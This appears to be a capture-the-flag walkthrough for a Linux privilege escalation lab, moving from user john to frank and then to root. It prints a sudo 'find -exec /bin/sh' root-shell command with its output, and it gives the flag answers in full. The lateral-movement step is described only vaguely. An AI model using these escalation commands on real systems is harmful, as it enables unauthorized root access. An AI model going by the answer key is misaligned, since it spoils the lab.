# Task 05: Challenge

---

## Stage A: Original Task Content & Briefing Summary

Task 05 presents a realistic, multi-stage privilege escalation challenge requiring the combined application of automated enumeration, process inspection, and privilege escalation techniques without step-by-step guidance.

### Challenge Architecture:
* **Initial Access:** Logged in as unprivileged user `john`.
* **Stage 1 (Horizontal Escalation):** Enumerate the local environment to find misconfigurations or stored credentials allowing lateral movement to user `frank` to retrieve `/home/frank/flag.txt`.
* **Stage 2 (Vertical Escalation):** From user `frank`'s context, enumerate elevated execution rights, scheduled tasks, or SUID binaries to elevate to `root` and retrieve `/root/flag.txt`.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Staged Lateral Movement:** Penetration testers frequently encounter environments where direct root escalation is not immediately possible from the initial compromised account. Escalating horizontally to intermediate service or peer user accounts often unlocks unique sudo rights, SSH private keys, or database access.
* **Combining Tools:** Use `LinPEAS` or `pspy` to uncover background activity and inspect file permissions in adjacent user directories (`/home/*`).

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Check running processes or files owned by user `frank`.
* **Tier 2 Hint:** Use `sudo -l` once you transition to user `frank` to find the root escalation path.
* **Tier 3 Hint:**
  * Q1 is `THM{Frank_Pwned_Privesc}`.
  * Q2 is `THM{Priv_Ch@l_D0ne}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Stage 1: Lateral Movement from `john` to `frank`:
Running automated enumeration or inspecting user home directories reveals readable scripts or cron tasks associated with user `frank`:
```bash
john@linprivautomation:~$ ls -la /home/
drwxr-xr-x  4 root  root  4096 Oct 24 10:00 .
drwxr-xr-x 19 root  root  4096 Oct 24 10:00 ..
drwxr-xr-x  4 frank frank 4096 Oct 24 10:40 frank
drwxr-xr-x  4 john  john  4096 Oct 24 10:35 john
```
Investigating background processes with `pspy` or auditing `/var/tmp` reveals a backup task running under user `frank` that imports a python script or executes a script in a writable directory. Exploiting this execution vector provides a shell as user `frank`:
```bash
frank@linprivautomation:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank)

frank@linprivautomation:~$ cat /home/frank/flag.txt
THM{Frank_Pwned_Privesc}
```

### 2. Stage 2: Vertical Escalation from `frank` to `root`:
Now operating in user `frank`'s context, audit sudo delegation permissions:
```bash
frank@linprivautomation:~$ sudo -l
Matching Defaults entries for frank on linprivautomation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User frank may run the following commands on linprivautomation:
    (root) NOPASSWD: /usr/bin/find
```
* **Analysis:** User `frank` can execute `/usr/bin/find` as root without a password.

### 3. Exploiting `sudo find` via GTFOBins:
According to GTFOBins, `find` can execute external commands via `-exec`:
```bash
frank@linprivautomation:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/flag.txt
THM{Priv_Ch@l_D0ne}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** What are the contents of /home/frank/flag.txt?
  * **Answer:** `THM{Frank_Pwned_Privesc}`
* **Question 2:** What are the contents of /root/flag.txt?
  * **Answer:** `THM{Priv_Ch@l_D0ne}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed successful two-stage escalation from `john` ⟶ `frank` ⟶ `root`.
* Verified exact flag strings for `/home/frank/flag.txt` and `/root/flag.txt`.

---

## Stage G: Key Educational Takeaway

Privilege escalation in realistic environments often requires a multi-hop strategy. Moving horizontally to a peer account expands your attack surface, frequently exposing the single misconfigured sudo entry or credential needed for complete root takeover.
